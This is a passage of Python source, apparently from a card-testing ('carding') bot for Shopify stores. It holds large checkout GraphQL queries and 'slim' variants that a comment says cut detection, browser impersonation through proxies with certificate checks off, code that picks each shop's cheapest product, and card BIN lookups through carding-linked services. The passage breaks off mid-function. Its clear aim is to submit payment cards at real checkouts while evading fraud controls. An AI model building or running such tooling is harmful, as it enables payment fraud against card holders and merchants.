    "orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}"
    "...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow "
    "paymentIntent paymentMethodIdentifier orderingIndex clientToken}"
    "...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier "
    "orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes "
    "maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}"
    "supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed "
    "ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}"
    "...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers "
    "acquirerCountryCode mode paymentMethodIdentifier orderingIndex}"
    "...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken "
    "walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}"
    "...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway "
    "gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}"
    "...on AmazonPayClassicWalletConfig{__typename name orderingIndex}"
    "...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName "
    "additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label "
    "value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename "
    "additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name "
    "availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails "
    "paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies "
    "__typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions "
    "paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}"
    "...on DeferredPaymentMethod{orderingIndex displayName __typename}"
    "...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name "
    "orderingIndex...CustomerCreditCardPaymentMethodFragment}"
    "...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail"
    "...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{"
    "...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id "
    "translatedName dueDate dueInDays type __typename}depositConfiguration{"
    "...on DepositPercentage{percentage __typename}__typename}__typename}"
    "...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}"
    "poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId "
    "merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}"
    "lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{"
    "...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}"
    "__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{"
    "signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges "
    "__typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{"
    "...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}"
    "shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode "
    "countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName "
    "firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing "
    "acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName "
    "address1 address2 phone postalCode city company zoneCode countryCode label __typename}"
    "__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone "
    "postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{"
    "id balance{amount currencyCode __typename}__typename}__typename}"
    "...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress "
    "__typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing "
    "acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone "
    "__typename}__typename}purchasingCompany{company{id externalId name __typename}contact{"
    "locationCount __typename}location{id externalId name billingAddress{firstName lastName "
    "address1 address2 phone postalCode city company zoneCode countryCode label __typename}"
    "shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode "
    "countryCode label __typename}__typename}__typename}phone email marketingConsent{"
    "...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}"
    "__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget "
    "recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}"
    "fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}"
    "subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "legacyAggregatedMerchandiseTermsAsFees{title description total{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}legacyRepresentProductsAsFees totalSavings{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}checkoutTotalTaxes{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping "
    "subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay "
    "__typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{"
    "totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}totalAmountIncludedInTarget{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}"
    "__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}"
    "__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}"
    "__typename}terms{...on FilledTipTerms{tipLines{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{"
    "...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}"
    "landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded "
    "nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index "
    "__typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties "
    "refuseDutiesPermitted __typename}attribution{attributions{"
    "...on RetailAttributions{deviceId locationId userId __typename}"
    "...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId "
    "__typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{"
    "recipient{...on StaffMember{id __typename}...on Location{id __typename}"
    "...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{"
    "...FilledMerchandiseLineTargetCollectionFragment"
    "...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}"
    "__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token "
    "__typename}...on PendingTerms{taskId pollDelay __typename}__typename}"
    "cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}"
    "alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount "
    "currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId "
    "__typename}__typename}__typename}isShippingRequired __typename}"
    "fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename"
    "...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime "
    "maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl "
    "lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}"
    "deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}"
    "promiseProviderApiClientId signedHandle returnability __typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}"
    "fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource "
    "redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{"
    "firstName lastName company address1 address2 city countryCode zoneCode postalCode phone "
    "__typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount "
    "currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}"
    "...on StoreCreditRedemptionContent{storeCreditAccountId __typename}"
    "...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier "
    "paymentMethodIdentifier __typename}__typename}__typename}"
    "fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{"
    "handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{"
    "smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target "
    "namespace value __typename}appName extensionLocale extensionPoints name registrationUuid "
    "scriptUrl translations uuid version __typename}__typename}"
    "fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{"
    "cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod "
    "deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 "
    "address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}"
    "__typename}__typename}"
    "fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{"
    "paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city "
    "company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}"
    "__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt "
    "paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{"
    "...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}"
    "...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}"
    "...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}"
    "...on WalletsPlatformPaymentMethod{name walletParams __typename}"
    "...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{"
    "...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode "
    "postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken "
    "paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:"
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}"
    "__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt "
    "merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits "
    "paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId "
    "__typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion "
    "paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{"
    "...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode "
    "postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData "
    "containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{"
    "autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 "
    "address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type "
    "__typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}"
    "__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{"
    "...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}"
    "...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier "
    "__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}"
    "...on CustomPaymentMethod{id name additionalDetails paymentInstructions "
    "paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier "
    "name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier "
    "__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}"
    "...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}"
    "...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment "
    "__typename}...on NoopPaymentMethod{__typename}__typename}__typename}"
)


# ── SLIM documents (chhote payload = kam detection) ─────────────────────────
QUERY_PROPOSAL_SLIM = (
    "query Proposal($sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$changesetTokens:[String!],$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,"
    "$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$tip:TipTermInput,"
    "$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,"
    "$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput) {"
    "session(sessionInput:$sessionInput) {"
    "negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,"
    "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,"
    "availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,"
    "saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,"
    "changesetTokens:$changesetTokens}) {"
    "__typename result { __typename"
    "... on NegotiationResultAvailable { checkpointData queueToken sellerProposal { __typename"
    "isShippingRequired"
    "runningTotal { ... on MoneyValueConstraint { value { amount currencyCode } } }"
    "total { ... on MoneyValueConstraint { value { amount currencyCode } } }"
    "checkoutTotal { ... on MoneyValueConstraint { value { amount currencyCode } } }"
    "tax { __typename"
    "... on FilledTaxTerms { totalTaxAmount { ... on MoneyValueConstraint { value { amount currencyCode } } } }"
    "... on PendingTerms { pollDelay } ... on UnavailableTerms { __typename } }"
    "delivery { __typename ... on FilledDeliveryTerms { deliveryLines {"
    "selectedDeliveryStrategy { ... on CompleteDeliveryStrategy { handle }"
    "... on DeliveryStrategyReference { handle } }"
    "availableDeliveryStrategies { ... on CompleteDeliveryStrategy { handle"
    "amount { ... on MoneyValueConstraint { value { amount currencyCode } } } } } } }"
    "... on PendingTerms { pollDelay taskId } ... on UnavailableTerms { __typename } }"
    "deliveryExpectations { __typename"
    "... on FilledDeliveryExpectationTerms { deliveryExpectations { deliveryStrategyHandle signedHandle } }"
    "... on PendingTerms { pollDelay taskId } ... on UnavailableTerms { __typename } }"
    "payment { __typename ... on FilledPaymentTerms { availablePaymentLines { paymentMethod {"
    "... on PaymentProvider { paymentMethodIdentifier name extensibilityDisplayName } } } }"
    "... on PendingTerms { pollDelay } ... on UnavailableTerms { __typename } }"
    "nonNegotiableTerms { signature contents { signature targetTerms targetLine { allLines index } attributes } }"
    "scriptFingerprint { signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges }"
    "transformerFingerprintV2"
    "captcha { __typename ... on Captcha { provider challenge sitekey token } } } }"
    "... on CheckpointDenied { redirectUrl }"
    "... on Throttled { pollAfter queueToken pollUrl }"
    "... on NegotiationResultFailed { __typename } }"
    "errors { code localizedMessage nonLocalizedMessage } __typename } __typename } }"
)

QUERY_POLL_SLIM = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,"
    "sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id token "
    "redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{__typename "
    "...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}}"
)

MUTATION_SUBMIT_SLIM = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){__typename ...on SubmitSuccess{receipt{...SlimReceipt __typename}"
    "__typename}...on SubmitAlreadyAccepted{receipt{...SlimReceipt __typename}__typename}"
    "...on SubmittedForCompletion{receipt{...SlimReceipt __typename}__typename}"
    "...on SubmitFailed{reason __typename}...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}...on SubmitRejected{errors{code "
    "localizedMessage nonLocalizedMessage __typename}__typename}__typename}}"
    "fragment SlimReceipt on Receipt{__typename ...on ProcessedReceipt{id token redirectUrl "
    "confirmationPage{url shouldRedirect __typename}orderStatusPageUrl __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{__typename "
    "...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}"
    "__typename}}"
)


def _check_queries():
    bad = []
    for name, q in (("proposal_full", QUERY_PROPOSAL), ("proposal_slim", QUERY_PROPOSAL_SLIM),
                    ("submit_full", MUTATION_SUBMIT), ("submit_slim", MUTATION_SUBMIT_SLIM),
                    ("poll_full", QUERY_POLL), ("poll_slim", QUERY_POLL_SLIM)):
        if not _gql_balanced(q):
            bad.append(name)
            log.error("[QUERY] %s imbalanced {=%d }=%d (=%d )=%d", name,
                      q.count("{"), q.count("}"), q.count("("), q.count(")"))
    if any(b.endswith("_slim") for b in bad):
        _SLIM["on"] = False
        log.error("[QUERY] slim broken -> FULL forced")
    return not bad


# ── proposal helpers ────────────────────────────────────────────────────────
def _tax_input(amount, currency, any_amount=True):
    proposed = ({"any": True} if (any_amount or amount is None)
                else {"value": {"amount": f"{float(amount):.2f}", "currencyCode": currency}})
    return {"proposedAllocations": None, "proposedTotalAmount": proposed,
            "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
            "proposedExemptions": []}


def _apply_addr(variables, addr, fn, ln):
    sa = {"address1": addr["address1"], "address2": "", "city": addr["city"],
          "countryCode": addr["countryCode"], "postalCode": addr["postalCode"],
          "firstName": fn, "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"]}
    try:
        variables["delivery"]["deliveryLines"][0]["destination"]["partialStreetAddress"] = dict(sa)
    except (KeyError, IndexError, TypeError):
        pass
    try:
        variables["payment"]["billingAddress"]["streetAddress"] = dict(sa)
    except (KeyError, TypeError):
        pass
    try:
        variables["buyerIdentity"]["customer"]["countryCode"] = addr["countryCode"]
        variables["buyerIdentity"]["phoneCountryCode"] = addr["countryCode"]
        variables["buyerIdentity"]["shopPayOptInPhone"]["countryCode"] = addr["countryCode"]
    except (KeyError, TypeError):
        pass


def _strategy_input(requires_shipping, handle, phone=None):
    if not requires_shipping:
        return None
    opts = {"options": {"phone": phone}} if phone else {"options": {}}
    if handle:
        return {"deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False}, **opts}
    return {"deliveryStrategyMatchingConditions":
            {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, **opts}


def _capture_artifacts(seller, variables):
    if not isinstance(seller, dict):
        return
    nnt = seller.get("nonNegotiableTerms")
    if isinstance(nnt, dict) and nnt.get("signature"):
        variables["nonNegotiableTerms"] = {"signature": nnt.get("signature"),
                                           "contents": nnt.get("contents")}
    cap = seller.get("captcha")
    if isinstance(cap, dict) and cap.get("__typename") == "Captcha":
        variables["captcha"] = {"provider": cap.get("provider"), "challenge": cap.get("challenge"),
                                "sitekey": cap.get("sitekey"), "token": cap.get("token")}
    sf = seller.get("scriptFingerprint")
    if isinstance(sf, dict):
        variables["scriptFingerprint"] = {
            "signature": sf.get("signature"), "signatureUuid": sf.get("signatureUuid"),
            "lineItemScriptChanges": sf.get("lineItemScriptChanges") or [],
            "paymentScriptChanges": sf.get("paymentScriptChanges") or [],
            "shippingScriptChanges": sf.get("shippingScriptChanges") or []}
    tf = seller.get("transformerFingerprintV2")
    if tf:
        variables["transformerFingerprintV2"] = tf


def _read_money(seller, totals):
    if not isinstance(seller, dict):
        return
    rt = ((seller.get("runningTotal") or {}).get("value") or {}).get("amount")
    if rt is not None:
        totals["running_total"] = rt
    ct = ((seller.get("checkoutTotal") or {}).get("value") or {}).get("amount")
    if ct is not None:
        totals["total_price"] = ct
    elif rt is not None:
        totals["total_price"] = rt
    for src in (seller.get("checkoutTotal"), seller.get("runningTotal"), seller.get("total")):
        cur = ((src or {}).get("value") or {}).get("currencyCode")
        if cur:
            totals["currency"] = cur
            break
    tax = seller.get("tax") or {}
    if tax.get("__typename") == "FilledTaxTerms":
        try:
            totals["tax_amount"] = float(
                ((tax.get("totalTaxAmount") or {}).get("value") or {}).get("amount"))
        except (TypeError, ValueError):
            pass


def _read_delivery(seller, ship):
    if not isinstance(seller, dict):
        return
    if seller.get("isShippingRequired") is False:
        ship["requires_shipping"] = False
    d = seller.get("delivery") or {}
    if d.get("__typename") == "FilledDeliveryTerms":
        lines = d.get("deliveryLines") or []
        if lines:
            line = lines[0]
            sel = line.get("selectedDeliveryStrategy") or {}
            if isinstance(sel, dict) and sel.get("handle"):
                ship["handle"] = sel["handle"]
            strats = line.get("availableDeliveryStrategies") or []
            if strats:
                chosen = None
                for s in strats:
                    if ship.get("handle") and s.get("handle") == ship["handle"]:
                        chosen = s
                        break
                if chosen is None:
                    chosen = strats[0]
                    if chosen.get("handle"):
                        ship["handle"] = chosen["handle"]
                try:
                    ship["shipping_amount"] = float(
                        ((chosen.get("amount") or {}).get("value") or {}).get("amount"))
                except (TypeError, ValueError):
                    pass
            tm = line.get("targetMerchandise") or {}
            mv2 = tm.get("linesV2") or []
            if mv2 and ((mv2[0].get("merchandise") or {}).get("requiresShipping") is False):
                ship["requires_shipping"] = False
    de = seller.get("deliveryExpectations") or {}
    if de.get("__typename") == "FilledDeliveryExpectationTerms":
        for exp in de.get("deliveryExpectations") or []:
            if exp.get("deliveryStrategyHandle") == ship.get("handle") and exp.get("signedHandle"):
                ship["signed_handle"] = exp["signedHandle"]
                break


# ── sessions ────────────────────────────────────────────────────────────────
async def _new_session(purl, prof):
    for name in prof["imp"]:
        if name and name not in _VALID_IMP:
            continue
        try:
            return AsyncSession(impersonate=name, verify=False, proxy=purl,
                                timeout=REQ_TIMEOUT, max_clients=10), name
        except Exception:
            continue
    return AsyncSession(verify=False, proxy=purl, timeout=REQ_TIMEOUT, max_clients=10), None


def _doc_headers(domain, fp):
    base = _norm(domain)
    h = {"User-Agent": fp["ua"],
         "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                    "image/avif,image/webp,*/*;q=0.8"),
         "Accept-Language": random.choice(ACCEPT_LANGS),
         "Referer": base + "/", "Upgrade-Insecure-Requests": "1",
         "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
         "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"}
    h.update(_ch_headers(fp))
    return h


# ── product fetch ───────────────────────────────────────────────────────────
PRODUCTS_Q = ("query FetchProducts($first:Int!){products(first:$first){edges{node{handle "
              "variants(first:50){edges{node{id availableForSale requiresShipping "
              "price{amount}}}}}}}}")

SKIP_TYPES = {"gift card", "gift cards", "gift_card", "gift_cards", "e-gift card",
              "egift card", "donation", "e-gift", "egift"}
SKIP_HANDLES = ("gift-card", "giftcard", "gift_card", "e-gift", "egift", "donation")


def _skip_product(p):
    if str(p.get("product_type", "")).lower() in SKIP_TYPES:
        return True
    h = str(p.get("handle", "")).lower()
    return any(k in h for k in SKIP_HANDLES)


def _vid_from_gid(gid):
    m = re.search(r"ProductVariant/(\d+)", str(gid or ""))
    return m.group(1) if m else None


def _pick_cheapest_json(prods, domain, physical_only=False):
    best = None
    bp = -1.0
    for p in prods:
        if _skip_product(p):
            continue
        handle = p.get("handle", "")
        for v in p.get("variants") or []:
            if v.get("available") is False:
                continue
            if v.get("requires_selling_plan"):
                continue
            ships = bool(v.get("requires_shipping", True))
            if physical_only and not ships:
                continue
            try:
                price = float(str(v.get("price", "0")).replace(",", ""))
            except (TypeError, ValueError):
                continue
            if price <= 0:
                continue
            if bp < 0 or price < bp:
                bp = price
                best = {"site": domain, "price": f"{price:.2f}",
                        "variant_id": str(v.get("id")), "requires_shipping": ships,
                        "link": f"{domain}/products/{handle}" if handle else domain}
    return best


def _pick_cheapest_gql(data, domain, physical_only=False):
    best = None
    bp = -1.0
    for edge in (data.get("products") or {}).get("edges") or []:
        node = edge.get("node") or {}
        if _skip_product(node):
            continue
        handle = node.get("handle", "")
        for ve in (node.get("variants") or {}).get("edges") or []:
            v = ve.get("node") or {}
            if not v.get("availableForSale"):
                continue
            vid = _vid_from_gid(v.get("id"))
            if not vid:
                continue
            ships = bool(v.get("requiresShipping", True))
            if physical_only and not ships:
                continue
            try:
                price = float(str((v.get("price") or {}).get("amount", "0")).replace(",", ""))
            except (TypeError, ValueError):
                continue
            if price <= 0:
                continue
            if bp < 0 or price < bp:
                bp = price
                best = {"site": domain, "price": f"{price:.2f}", "variant_id": vid,
                        "requires_shipping": ships,
                        "link": f"{domain}/products/{handle}" if handle else domain}
    return best


async def fetch_products(domain, purl=None, sess=None, prof=None, physical_only=False):
    domain = _norm(domain)
    prof = prof or _pick_profile()
    own = sess is None
    if own:
        sess, _ = await _new_session(purl, prof)
    try:
        ua_h = {"User-Agent": prof["ua"], "Accept": "application/json",
                "Accept-Language": random.choice(ACCEPT_LANGS),
                "Referer": domain + "/"}
        ua_h.update(_ch_headers(prof))

        for attempt in range(2):
            try:
                r = await sess.get(domain + "/products.json?limit=250", headers=ua_h,
                                   allow_redirects=True, timeout=PRODUCT_TIMEOUT)
                if r.status_code in (429, 503) and attempt == 0:
                    await asyncio.sleep(1.2 + random.random() * 1.8)
                    continue
                if r.status_code != 200:
                    return None, f"Site error: HTTP {r.status_code}"
                try:
                    data = r.json()
                except Exception:
                    return None, "Site error: bad json"
                prods = data.get("products") or []
                if not prods:
                    return None, "No products found"
                picked = _pick_cheapest_json(prods, domain, physical_only)
                if picked:
                    return picked, None
                return None, "No valid products with price > 0"
            except Exception as e:
                if attempt == 0:
                    await asyncio.sleep(0.4)
                    continue
                return None, f"Site error: {e}"
        return None, "No products found"
    finally:
        if own:
            try:
                await sess.close()
            except Exception:
                pass


# ── BIN lookup ──────────────────────────────────────────────────────────────
BIN_FALLBACK = {"brand": "-", "type": "-", "level": "-", "bank": "-",
                "country": "-", "flag": ""}


def _or_dash(v):
    s = str(v)
    return "-" if s in ("", "None", "<nil>", "<NIL>") else s


def bin_lookup(bin6):
    b = str(bin6 or "").strip()[:6]
    if len(b) < 6:
        return BIN_FALLBACK
    if b in _BIN_CACHE:
        return _BIN_CACHE[b]
    try:
        from urllib.request import urlopen
        try:
            raw = urlopen(f"https://bins.antipublic.cc/bins/{b}", timeout=6).read()
            d = json.loads(raw)
            if d.get("brand"):
                info = {"brand": _or_dash(d.get("brand")), "type": _or_dash(d.get("type")),
                        "level": _or_dash(d.get("level")), "bank": _or_dash(d.get("bank")),
                        "country": _or_dash(d.get("country_name")),
                        "flag": _or_dash(d.get("country_flag"))}
                _BIN_CACHE[b] = info
                return info
        except Exception:
            pass
        try:
            raw = urlopen(f"https://lookup.binlist.net/{b}", timeout=6).read()
            d = json.loads(raw)
            scheme = str(d.get("scheme", "")).upper()
            if scheme:
